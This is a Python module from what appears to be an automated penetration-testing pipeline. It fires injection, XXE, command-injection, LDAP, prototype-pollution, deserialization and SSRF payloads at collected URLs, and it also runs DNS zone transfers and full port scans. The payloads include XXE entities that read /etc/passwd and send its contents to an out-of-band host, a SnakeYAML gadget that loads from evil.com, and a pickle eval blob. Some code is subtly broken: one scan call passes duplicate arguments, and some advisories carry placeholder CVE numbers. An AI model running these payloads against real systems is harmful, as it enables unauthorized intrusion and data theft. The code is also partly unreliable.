"""Injection, SSRF, DNS zone transfer, and port scanning phases."""

from reconchain.phases.helpers import *

_NOSQLI_PAYLOADS: List[Dict[str, Any]] = [
    {"$gt": ""},
    {"$ne": ""},
    {"$gt": "admin"},
    {"$regex": ".*"},
    {"$where": "1==1"},
    {"$exists": True},
    {"$ne": "nonexistent"},
    {"$in": ["admin", "true"]},
]
_NOSQLI_PARAMS = {"username", "user", "pass", "password", "email", "token", "id", "role", "admin", "name"}

async def phase_22_NOSQLI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"22-NOSQLI"}:
        return {}
    _out = outdir / "nosqli.txt"
    if _out.exists() and not force:
        return {"22-NOSQLI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 22-NOSQLI: NoSQL injection probes")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "22-NOSQLI: no URLs; skipping")
        return {"22-NOSQLI": str(_out), "count": 0}
    findings: List[str] = []
    _n_urlopen = _get_urlopener()
    _n_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_nosqli]
    _NOSQLI_BASELINE_KEYWORDS = {"mongodb", "mongo", "nosql", "cast", "objectid"}
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        baseline_body_lower = ""
        try:
            base_req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers})
            _, _, base_bytes = await _async_urlopen(_n_urlopen, base_req, timeout=10)
            baseline_body_lower = base_bytes.decode("utf-8", errors="ignore").lower()
        except Exception:
            continue
        for param_name in qs:
            if param_name.lower() not in _NOSQLI_PARAMS:
                continue
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in _NOSQLI_PAYLOADS:
                try:
                    await _throttle_rate()
                    test_qs = qs.copy()
                    test_qs[param_name] = [json.dumps(payload)]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers})
                    ns_status, _, ns_body = await _async_urlopen(_n_urlopen, req, timeout=10)
                    body = ns_body.decode("utf-8", errors="ignore").lower()
                    if ns_status in (200, 201) and body != baseline_body_lower:
                        findings.append(f"[nosqli-payload] {test_url} param={param_name} payload={json.dumps(payload)} (body changed from baseline)")
                        break
                    if ns_status in (500, 400):
                        baseline_new_kw = {w for w in _NOSQLI_BASELINE_KEYWORDS if w in body and w not in baseline_body_lower}
                        if baseline_new_kw:
                            findings.append(f"[nosqli-error] {test_url} param={param_name} payload={json.dumps(payload)} → HTTP {ns_status} keywords={baseline_new_kw}")
                            break
                except Exception:
                    continue
    # Also probe JSON API endpoints with NoSQL bodies
    api_targets = [u.split("?")[0] for u in all_urls if "/api/" in u.lower() and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_nosqli]
    for u in api_targets:
        api_baseline = ""
        try:
            base_req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers})
            _, _, base_bytes = await _async_urlopen(_n_urlopen, base_req, timeout=10)
            api_baseline = base_bytes.decode("utf-8", errors="ignore").lower()
        except Exception:
            continue
        for payload in _NOSQLI_PAYLOADS:
            try:
                await _throttle_rate()
                body_data = json.dumps({"username": payload, "password": {"$ne": ""}}).encode()
                req = urllib.request.Request(u, data=body_data, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", **_n_extra_headers})
                ns_status, _, ns_body = await _async_urlopen(_n_urlopen, req, timeout=10)
                ns_body_text = ns_body.decode("utf-8", errors="ignore").lower()
                if ns_status in (200, 201) and ns_body_text != api_baseline:
                    findings.append(f"[nosqli-json] POST {u} payload={json.dumps(payload)} → HTTP {ns_status} (body changed)")
            except Exception:
                continue
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"22-NOSQLI: {len(findings)} NoSQL injection probes → {out}")
    return {"22-NOSQLI": str(out), "count": len(findings)}

async def phase_25_XXE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], oast_domain: Optional[str], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"25-XXE"}:
        return {}
    _out = outdir / "xxe.txt"
    if _out.exists() and not force:
        return {"25-XXE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 25-XXE: XML external entity injection probes")
    findings: List[str] = []
    _x_urlopen = _get_urlopener()
    _xxe_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "25-XXE: no URLs; skipping")
        return {"25-XXE": str(_out), "count": 0}
    targets = [u.split("?")[0] for u in all_urls][:_PIPELINE_CFG.sample_urls_xxe]
    oast_ref = oast_domain or "burpcollaborator.net"
    _xxe_p1 = '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'''
    _xxe_p2 = '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>'''
    _xxe_p3 = f'''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM "http://{oast_ref}/xxe-oob"> %test;]><root/>'''
    _xxe_p4 = f'''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{oast_ref}/xxe?data=%file;'>">%eval;%exfil;]><root/>'''
    xxe_payloads = [_xxe_p1, _xxe_p2, _xxe_p3, _xxe_p4]
    async def _probe_xxe(url: str) -> List[str]:
        results: List[str] = []
        for i, payload in enumerate(xxe_payloads):
            try:
                req = urllib.request.Request(url, data=payload.encode("utf-8"), method="POST",
                    headers={"Content-Type": "application/xml", "User-Agent": "Mozilla/5.0", **_xxe_extra_headers})
                xs, _, xb = await _async_urlopen(_x_urlopen, req, timeout=10)
                body = xb.decode("utf-8", errors="ignore")
                if "root" in body and ("root" in body[:100] or xs in (200, 201)):
                    results.append(f"[xxe-candidate] {url} payload={i} HTTP {xs}")
                    break
            except urllib.error.HTTPError as e:
                try:
                    body = e.read().decode("utf-8", errors="ignore")
                    if "root" in body or "file" in body.lower():
                        results.append(f"[xxe-error-reflected] {url} payload={i} HTTP {e.code}")
                        break
                except Exception:
                    continue
            except Exception:
                continue
        return results
    xxe_results = await asyncio.gather(*[_probe_xxe(t) for t in targets])
    for xr in xxe_results:
        findings.extend(xr)
    if not findings:
        findings.append("[xxe] No XXE candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"25-XXE: {len(findings)} XXE probe findings → {out}")
    return {"25-XXE": str(out), "count": len(findings)}

_CMDI_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; uname -a",
    "| whoami",
    "; ping -c 1 127.0.0.1",
    "| nslookup example.com",
    "& echo ${PATH}",
]
_CMDI_PARAMS = {"host", "ping", "domain", "server", "ip", "target", "url", "path", "cmd", "command", "exec", "shell", "dir", "folder", "file"}

async def phase_26_CMDINJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"26-CMDINJECT"}:
        return {}
    _out = outdir / "cmd_injection.txt"
    if _out.exists() and not force:
        return {"26-CMDINJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 26-CMDINJECT: OS command injection detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "26-CMDINJECT: no URLs; skipping")
        return {"26-CMDINJECT": str(_out), "count": 0}
    findings: List[str] = []
    _c_urlopen = _get_urlopener()
    _cmdi_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:_PIPELINE_CFG.sample_urls_cmdi]
    if t.has("commix") and param_urls:
        commix_outdir = outdir / "logs" / "commix"
        commix_outdir.mkdir(parents=True, exist_ok=True)
        for u in param_urls:
            runner = outdir / "logs" / f"commix_{_safe_name(u)}_runner.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"URL={shlex.quote(u)}\n"
                f"OUT={shlex.quote(str(commix_outdir))}\n"
                'commix -u "$URL" --batch --output-dir="$OUT" < /dev/null\n'
            )
            runner.chmod(0o700)
            await _run(
                f"commix-{_safe_name(u)}",
                ["bash", str(runner)],
                600, outdir,
            )
        commix_reports = list(commix_outdir.glob("**/*.txt"))
        if commix_reports:
            findings.append(f"[commix] {len(commix_reports)} report files → {commix_outdir}")
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in _CMDI_PARAMS:
                continue
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in _CMDI_PAYLOADS:
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    await _throttle_rate()
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_cmdi_extra_headers})
                    _, _, body_bytes = await _async_urlopen(_c_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    indicators = ["uid=", "gid=", "groups=", "linux", "darwin", "www-data", "root:", "bin/",
                                  "microsoft", "windows", "nt authority", "command not found", "not recognized"]
                    if any(ind in body.lower() for ind in indicators):
                        findings.append(f"[cmdi-candidate] {test_url} param={param_name} payload={payload}")
                        break
                except Exception:
                    continue
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"26-CMDINJECT: {len(findings)} command injection probes → {out}")
    return {"26-CMDINJECT": str(out), "count": len(findings)}

async def phase_27_SSPP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"27-SSPP"}:
        return {}
    _out = outdir / "sspp.txt"
    if _out.exists() and not force:
        return {"27-SSPP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 27-SSPP: server-side prototype pollution probes")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "27-SSPP: no URLs; skipping")
        return {"27-SSPP": str(_out), "count": 0}
    findings: List[str] = []
    _s_urlopen = _get_urlopener()
    _sspp_extra_headers = _extra_headers_dict()
    api_targets = [u.split("?")[0] for u in all_urls if "/api/" in u.lower()][:_PIPELINE_CFG.sample_endpoints_sspp]
    sspp_payloads = [
        {"__proto__": {"admin": True}},
        {"__proto__": {"is_admin": True}},
        {"constructor": {"prototype": {"admin": True}}},
        {"__proto__": {"role": "admin"}},
        {"__proto__": {"status": "active"}},
    ]
    for u in api_targets:
        for payload in sspp_payloads:
            try:
                body_data = json.dumps(payload).encode()
                req = urllib.request.Request(u, data=body_data, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", **_sspp_extra_headers})
                ss, _, sb = await _async_urlopen(_s_urlopen, req, timeout=10)
                if ss in (200, 201, 302):
                    findings.append(f"[sspp-candidate] POST {u} payload={json.dumps(payload)} → HTTP {ss}")
            except urllib.error.HTTPError as e:
                if 500 <= e.code < 600:
                    findings.append(f"[sspp-crash-candidate] POST {u} payload={json.dumps(payload)} → HTTP {e.code}")
            except Exception:
                continue
    if not findings:
        findings.append("[sspp] No prototype pollution candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"27-SSPP: {len(findings)} prototype pollution probes → {out}")
    return {"27-SSPP": str(out), "count": len(findings)}

_DEP_CHECK_PATTERNS: List[Tuple[str, str, str, str]] = [
    ("jquery", r"jquery[.-]?([\d.]+)", "3.5.0", "CVE-2020-11023+ (XSS via HTML parsing)"),
    ("angular", r"angular[.-]?([\d.]+)", "1.8.0", "CVE-2022-25869 (XSS)"),
    ("react", r"react[.-]?([\d.]+)", "16.14.0", "CVE-2023-XXXX (various)"),
    ("lodash", r"lodash[.-]?([\d.]+)", "4.17.21", "CVE-2021-23337 (prototype pollution)"),
    ("vue", r"vue[.-]?([\d.]+)", "2.7.0", "CVE-2023-XXXX (XSS)"),
    ("moment", r"moment[.-]?([\d.]+)", "2.29.4", "CVE-2022-24785 (ReDoS)"),
    ("bootstrap", r"bootstrap[.-]?([\d.]+)", "4.6.2", "CVE-2020-11023 (XSS)"),
    ("express", r"express[.-]?([\d.]+)", "4.18.2", "CVE-2022-24999 (qs prototype pollution)"),
]


def _parse_semver(ver: str) -> Optional[Tuple[int, int, int]]:
    parts = ver.split(".")
    if len(parts) >= 3 and all(p.isdigit() for p in parts[:3]):
        return (int(parts[0]), int(parts[1]), int(parts[2]))
    if len(parts) >= 2 and all(p.isdigit() for p in parts[:2]):
        return (int(parts[0]), int(parts[1]), 0)
    return None


def _semver_lt(v1: Tuple[int, int, int], v2: Tuple[int, int, int]) -> bool:
    return v1 < v2


async def phase_29_DEPCHECK(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"29-DEPCHECK"}:
        return {}
    _out = outdir / "depcheck.txt"
    if _out.exists() and not force:
        return {"29-DEPCHECK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 29-DEPCHECK: JS dependency vulnerability scanning")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _dc_extra_headers = _extra_headers_dict()
    js_urls = outdir / "urls_js.txt"
    all_js = read_lines(js_urls) if js_urls.exists() else []
    if not all_js:
        await asyncio.sleep(3)
        all_js = read_lines(js_urls) if js_urls.exists() else []
    if not all_js:
        log("warn", "29-DEPCHECK: no JS URLs; skipping")
        return {"29-DEPCHECK": str(_out), "count": 0}
    scanned = 0
    seen_deps: Set[str] = set()
    for js_url in all_js[:_PIPELINE_CFG.sample_urls_depcheck]:
        try:
            req = urllib.request.Request(js_url, headers={"User-Agent": "Mozilla/5.0", **_dc_extra_headers})
            _, _, body_bytes = await _async_urlopen(_d_urlopen, req, timeout=15)
            body = body_bytes.decode("utf-8", errors="ignore")
            scanned += 1
            for dep_name, pattern, safe_ver_str, advisory in _DEP_CHECK_PATTERNS:
                for m in re.finditer(pattern, body, re.IGNORECASE):
                    ver = m.group(1)
                    cache_key = f"{dep_name}@{ver}"
                    if cache_key in seen_deps:
                        continue
                    seen_deps.add(cache_key)
                    parsed = _parse_semver(ver)
                    safe_ver = _parse_semver(safe_ver_str)
                    if parsed and safe_ver and _semver_lt(parsed, safe_ver):
                        findings.append(f"[outdated] {dep_name} v{ver} in {js_url} — {advisory}")
                    else:
                        findings.append(f"[dep] {dep_name} v{ver} in {js_url} (current)")
        except Exception:
            continue
    findings.append(f"[depcheck] scanned {scanned} JS files, {len(seen_deps)} unique dependencies found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"29-DEPCHECK: {len(findings)} dependency findings → {out}")
    return {"29-DEPCHECK": str(out), "count": len(findings)}

async def phase_42_LDAP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"42-LDAP"}:
        return {}
    _out = outdir / "ldap_injection_42.txt"
    if _out.exists() and not force:
        return {"42-LDAP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 42-LDAP: LDAP injection detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "42-LDAP: no URLs; skipping")
        return {"42-LDAP": str(_out), "count": 0}
    findings: List[str] = []
    _l_urlopen = _get_urlopener()
    _l_extra_headers = _extra_headers_dict()
    param_urls = [
        u for u in all_urls if "=" in u and not _is_static_url(u)
    ][:_PIPELINE_CFG.sample_urls_ldap]
    _LDAP42_PAYLOADS = ["*", "*)(uid=*))", "*)(|(uid=*", "admin*", "*|uid=*", "*((uid=*", "*)(uid=*"]
    _LDAP42_SPECIFIC = [
        "javax.naming", "ldapexception", "ldap_error", "invalid dn syntax",
        "ldap_no_such_object", "operationserror", "invalidcredentials",
        "ldap_result_entry", "com.sun.jndi.ldap",
    ]
    _LDAP42_GENERIC_BASELINE = {"error", "syntax", "malformed", "bad search filter", "protocol error"}
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        baseline_lower = ""
        try:
            base_req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0", **_l_extra_headers})
            _, _, base_bytes = await _async_urlopen(_l_urlopen, base_req, timeout=8)
            baseline_lower = base_bytes.decode("utf-8", errors="ignore").lower()
        except Exception:
            continue
        for pname in qs:
            if pname.lower() in _SKIP_PARAMS:
                continue
            for payload in _LDAP42_PAYLOADS:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_l_extra_headers})
                    _, _, body_bytes = await _async_urlopen_no_redirect(_l_urlopen, req, timeout=8)
                    body = body_bytes.decode("utf-8", errors="ignore").lower()
                    if any(ind in body for ind in _LDAP42_SPECIFIC):
                        findings.append(f"[ldap-candidate] {test_url} param={pname} payload={payload}")
                        break
                    generic_new = {w for w in _LDAP42_GENERIC_BASELINE if w in body and w not in baseline_lower}
                    if generic_new:
                        findings.append(f"[ldap-candidate-generic] {test_url} param={pname} payload={payload} keywords={generic_new}")
                        break
                except Exception:
                    continue
    if not findings:
        findings.append("[ldap] No LDAP injection candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"42-LDAP: {len(findings)} LDAP probes -> {out}")
    return {"42-LDAP": str(out), "count": len(findings)}

_DESERIAL_PAYLOADS: List[Tuple[str, bytes, str]] = [
    ("PHP", b'O:1:"A":0:{}', "PHP unserialize"),
    ("PHP", b'a:1:{i:0;O:1:"B":0:{}}', "PHP array unserialize"),
    ("Java", b'\xac\xed\x00\x05', "Java serialization (0xACED0005)"),
    ("Java", b'\xac\xed\x00\x05sr\x00\x12java.lang.Runtime', "Java Runtime serialization"),
    ("Python", b'(dp0\nS\'test\'\np1\n.', "Python pickle protocol 0"),
    ("Python", b'\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x8c\x04eval\x93\x00.',
     "Python pickle protocol 4 eval"),
    ("Ruby", b'\x04\x08o:\x08Object\x00', "Ruby Marshal.load"),
    (".NET", b'\x00\x01\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00',
     ".NET BinaryFormatter"),
    ("Node.js", b'{"__proto__":{"admin":true},"rce":"_$$ND_FUNC$$_function(){}"}',
     "Node.js serialize __proto__ pollution"),
    ("YAML", b'!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com/"]]]]',
     "YAML deserialization (SnakeYAML)"),
]


async def phase_43_DESERIAL(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"43-DESERIAL"}:
        return {}
    _out = outdir / "deserialization.txt"
    if _out.exists() and not force:
        return {"43-DESERIAL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 43-DESERIAL: insecure deserialization payload probing")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _d_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    api_targets = list({u.split("?")[0] for u in all_urls
        if any(m in u.lower() for m in ("/api/", "/v1/", "/v2/", "/graphql", "/rpc"))})[:_PIPELINE_CFG.sample_endpoints_deserial]
    if not api_targets:
        api_targets = list({u.split("?")[0] for u in all_urls})[:_PIPELINE_CFG.sample_endpoints_deserial]
    if not api_targets:
        log("warn", "43-DESERIAL: no API endpoints; skipping")
        return {"43-DESERIAL": str(_out), "count": 0}
    for ep in api_targets:
        for lang, payload, desc in _DESERIAL_PAYLOADS:
            try:
                req = urllib.request.Request(ep, data=payload, method="POST",
                    headers={"Content-Type": "application/octet-stream",
                             "User-Agent": "Mozilla/5.0", **_d_extra_headers})
                ds, _, db = await _async_urlopen_no_redirect(_d_urlopen, req, timeout=15)
                body = db.decode("utf-8", errors="ignore").lower()
                if ds in (500, 502, 503, 504):
                    findings.append(f"[deserial-crash] {ep} {lang} -> HTTP {ds} ({desc})")
                elif ds in (200, 201, 302):
                    time_indicators = ["error", "exception", "class", "object", "unserialize", "deserialize",
                                       "stack trace", "warning", "fatal"]
                    if any(ind in body for ind in time_indicators):
                        findings.append(f"[deserial-reflected] {ep} {lang} -> error indicators in response ({desc})")
            except urllib.error.HTTPError as e:
                if e.code in (500, 502, 503, 504, 400):
                    try:
                        err_body = e.read().decode("utf-8", errors="ignore").lower()
                        if any(ind in err_body for ind in ["error", "exception", "class", "object", "stack", "unserialize"]):
                            findings.append(f"[deserial-error] {ep} {lang} -> HTTP {e.code} with error details ({desc})")
                    except Exception:
                        pass
            except Exception:
                continue
    if not findings:
        findings.append("[deserial] No deserialization vulnerabilities detected (may require manual testing)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"43-DESERIAL: {len(findings)} deserialization probes -> {out}")
    return {"43-DESERIAL": str(out), "count": len(findings)}

async def phase_66_SSRF_FULL(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any],
    oast_domain: str = "", force: bool = False,
) -> Dict[str, Any]:
    if skip & {"66-SSRF-FULL"}:
        return {}
    _out = outdir / "ssrf_full.txt"
    if _out.exists() and not force:
        return {"66-SSRF-FULL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 66-SSRF-FULL: SSRF with OOB callback testing")
    findings: List[str] = []
    _sf_urlopen = _get_urlopener()
    _sf_extra = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        findings.append("[ssrf-full] No URLs available for testing")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"66-SSRF-FULL": str(_out), "count": len(findings)}

    callback = oast_domain or ""
    if not callback:
        findings.append("[ssrf-full] No OAST callback domain available (use --oast-domain)")
    else:
        urls = read_lines(urls_file)[:_PIPELINE_CFG.sample_urls_fuzz]
        ssrf_params = ["url", "uri", "file", "path", "dest", "redirect", "return",
                       "next", "img", "image", "load", "read", "document", "page",
                       "folder", "root", "host", "domain", "show", "view", "dir",
                       "location", "target", "to", "out", "data", "reference", "site"]
        for url in urls:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in qs:
                if param.lower() in ssrf_params:
                    new_qs = []
                    for k, vals in qs.items():
                        for v in vals:
                            if k == param:
                                new_qs.append((k, f"http://{callback}/ssrf/{param}"))
                            else:
                                new_qs.append((k, v))
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, urllib.parse.urlencode(new_qs), parsed.fragment,
                    ))
                    try:
                        req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_sf_extra})
                        status, _, _ = await _async_urlopen(_sf_urlopen, req, timeout=10)
                        if status in (200, 301, 302):
                            findings.append(f"[ssrf-oob-tested] {test_url} → HTTP {status} (check OAST for callback)")
                    except Exception as e:
                        if "timeout" not in str(e).lower():
                            findings.append(f"[ssrf-oob-error] {test_url} → {e}")

    if not findings:
        findings.append("[ssrf-full] No SSRF parameters found or tested")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"66-SSRF-FULL: {len(findings)} findings → {out}")
    return {"66-SSRF-FULL": str(_out), "count": len(findings)}


async def phase_69_DNSZT(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"69-DNSZT"}:
        return {}
    _out = outdir / "dns_zone_transfer.txt"
    if _out.exists() and not force:
        return {"69-DNSZT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 69-DNSZT: DNS zone transfer")
    findings: List[str] = []

    async def _get_nameservers() -> List[str]:
        ns: List[str] = []
        if t.has("dig"):
            try:
                rc, stdout, _ = await _run_cmd_clear_proxy(["dig", "+short", "NS", domain])
                if rc == 0:
                    ns = [ln.decode().strip().rstrip(".") for ln in stdout.splitlines() if ln.strip()]
            except Exception:
                pass
        if not ns:
            try:
                rc, stdout, _ = await _run_cmd_clear_proxy(["nslookup", "-type=NS", domain])
                if rc == 0:
                    for ln in stdout.decode(errors="ignore").splitlines():
                        m = re.search(r'nameserver\s*=\s*(\S+)', ln, re.IGNORECASE)
                        if m:
                            ns.append(m.group(1).rstrip("."))
            except Exception:
                pass
        return ns

    nameservers = await _get_nameservers()
    if not nameservers:
        findings.append("[dns-zt] No nameservers found for domain")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"69-DNSZT": str(_out), "count": len(findings)}

    for ns in nameservers:
        if t.has("dig"):
            try:
                rc, stdout, stderr = await _run_cmd_clear_proxy(["dig", "@" + ns, domain, "AXFR"], timeout=15)
                output = stdout.decode(errors="ignore")
                err_text = stderr.decode(errors="ignore")
                if "Transfer failed" in err_text or "refused" in err_text.lower() or "timed out" in err_text.lower():
                    findings.append(f"[dns-zt-secure] {ns} — zone transfer refused (secure)")
                elif any(ln.strip() and "IN" in ln for ln in output.splitlines() if "SOA" in ln or "NS" in ln or "A" in ln):
                    n_records = len([ln for ln in output.splitlines() if ln.strip()])
                    findings.append(f"[dns-zt-vulnerable] {ns} — zone transfer SUCCEEDED ({n_records} records)")
                    for ln in output.splitlines()[:20]:
                        findings.append(f"  {ln.strip()}")
                    if n_records > 20:
                        findings.append(f"  … and {n_records - 20} more records")
                else:
                    findings.append(f"[dns-zt-checked] {ns} — no zone data returned")
            except asyncio.TimeoutError:
                findings.append(f"[dns-zt-timeout] {ns} — zone transfer timed out")
            except Exception as e:
                findings.append(f"[dns-zt-error] {ns} — {e}")

    if not findings:
        findings.append("[dns-zt] No zone transfer tests completed")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"69-DNSZT: {len(findings)} findings → {out}")
    return {"69-DNSZT": str(_out), "count": len(findings)}


# ────────────────── Phase 70-PORTFULL: full port scan on top target ──────
async def phase_70_PORTFULL(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"70-PORTFULL"}:
        return {}
    _out = outdir / "ports_full.txt"
    if _out.exists() and not force:
        return {"70-PORTFULL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 70-PORTFULL: full port scan (-p-) on top target")
    findings: List[str] = []
    hosts_file = outdir / "hosts.txt"
    if not hosts_file.exists() or not read_lines(hosts_file):
        findings.append("[portfull] No hosts available")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"70-PORTFULL": str(_out), "count": len(findings)}

    top_hosts = [h.split("://")[-1].split("/")[0].split(":")[0] for h in read_lines(hosts_file)][:3]
    for host in top_hosts:
        port_out: Optional[Path] = None
        try:
            if t.has("nmap"):
                port_out = outdir / f"ports_full_{_safe_name(host)}.txt"
                _full_timing = ["-T3", "--min-rate", "200"] if _PIPELINE_CFG.safe_mode else ["-T4", "--min-rate", "500"]
                _full_timeout = 1800 if _PIPELINE_CFG.safe_mode else 3600
                await _run(
                    f"nmap-full-{_safe_name(host)[:16]}",
                    ["nmap", "-Pn", "-p-", "--open"] + _full_timing + ["-oG", str(port_out), host],
                    _full_timeout, outdir,
                    3600, outdir,
                )
                if port_out.exists():
                    port_lines = read_lines(port_out)
                    open_ports = [ln for ln in port_lines if "/open/" in ln]
                    if open_ports:
                        for ln in open_ports:
                            findings.append(f"[portfull-found] {host} → {ln.strip()}")
                    else:
                        findings.append(f"[portfull-clean] {host} — no open ports beyond top-1000")
            elif t.has("naabu"):
                port_out = outdir / f"ports_full_{_safe_name(host)}.txt"
                await _run(
                    f"naabu-full-{_safe_name(host)[:16]}",
                    ["naabu", "-silent", "-host", host, "-p", "-", "-o", str(port_out)],
                    3600, outdir,
                )
                if port_out.exists() and read_lines(port_out):
                    for ln in read_lines(port_out):
                        findings.append(f"[portfull-found] {ln.strip()}")
                else:
                    findings.append(f"[portfull-clean] {host} — no additional ports found")
        finally:
            if port_out and port_out.exists():
                port_out.unlink(missing_ok=True)

    if not findings:
        findings.append("[portfull] No full port scan performed (nmap/naabu required)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"70-PORTFULL: {len(findings)} findings → {out}")
    return {"70-PORTFULL": str(_out), "count": len(findings)}
